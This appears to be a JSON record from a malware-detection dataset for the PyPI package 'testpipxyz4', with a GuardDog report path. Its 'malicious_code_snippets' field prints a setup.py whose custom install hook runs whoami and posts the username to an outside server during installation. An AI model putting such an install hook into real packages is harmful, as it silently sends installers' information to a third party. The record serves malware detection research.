[
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "import subprocess\nimport requests\nfrom setuptools.command.install import install\n\n# Custom install command\nclass CustomInstallCommand(install):\n    def run(self):\n        # Run the whoami command\n        result = subprocess.run([\"whoami\"], capture_output=True, text=True)\n        username = result.stdout.strip()\n\n        # Send POST request to your server\n        url = \"https://vigneshsb.me/test.php\"\n        data = {\n            \"username\": username,\n            \"package name\": \"testpipxyz4\"\n        }\n\n        try:\n            response = requests.post(url, data=data)\n            response.raise_for_status()\n            print(\"POST request sent successfully.\")\n        except requests.exceptions.RequestException as e:\n            print(\"Failed to send POST request:\", str(e))\n\n        # Continue with the installation\n        install.run(self)"
  },
  {
    "metadata": {
      "package_name": "testpipxyz4-1.0.0",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/testpipxyz4-1.0.0.txt"
    }
  }
]